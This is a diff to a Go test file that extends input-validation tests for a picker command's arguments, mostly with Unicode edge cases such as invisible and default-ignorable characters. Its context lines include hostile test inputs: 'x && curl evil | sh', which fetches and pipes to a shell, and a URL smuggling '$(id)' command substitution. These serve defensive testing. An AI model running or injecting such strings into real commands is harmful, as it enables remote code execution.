@@ -129,6 +129,9 @@ func TestPickerArgv_HostileFreeText(t *testing.T) {
 		"x && curl evil | sh",
 		"https://github.com/o/r/pull/1?x=$(id)",
 		strings.Repeat("é", pickerArgMaxRunes),
+		// A combining mark outside Variation_Selector is text, not an
+		// invisible rune (#948): decomposed accents still pass.
+		"cafe\u0301",
 	} {
 		argv, err := PickerArgv(prefix, arg, false)
 		if err != nil {
@@ -157,6 +160,16 @@ func TestPickerArgv_HostileFreeText(t *testing.T) {
 		"o/r\u00ad#1",
 		"o/r#1\U000E0041\U000E007F",
 		"o/r\u2028#1",
+		// Default-ignorable runes outside Cf, and the braille blank (#948):
+		// Go counts each as graphic, so the renderers show them as is.
+		"o/r\ufe0f#1",
+		"o/r#1\U000E0100",
+		"o/r\u034f#1",
+		"\u3164",
+		"o/r#1\uffa0",
+		"\u115f\u1160",
+		"\u2800",
+		"o/r\u2800#1",
 		"\xff\xfe",
 		strings.Repeat("a", pickerArgMaxRunes+1),
 	} {
@@ -209,7 +222,7 @@ func TestDisplayArgv(t *testing.T) {
 func pickerHubModel(sources map[string]ArgSource) model {
 	hub := []HubEntry{
 		{Name: "pr", Short: "review a PR", Core: true, Use: "pr <ref>", Leaves: []HubLeaf{
-			{Name: "pr", Short: "review a PR", Use: "pr <ref>", NeedsArgs: true},
+			{Name: "pr", Short: "review a PR", Use: "pr <ref>", NeedsArgs: true, Self: true},
 			{Name: "list", Short: "list sessions", Use: "list"},
 		}},
 		{Name: "projects", Short: "projects", Core: true, Use: "projects", Leaves: []HubLeaf{
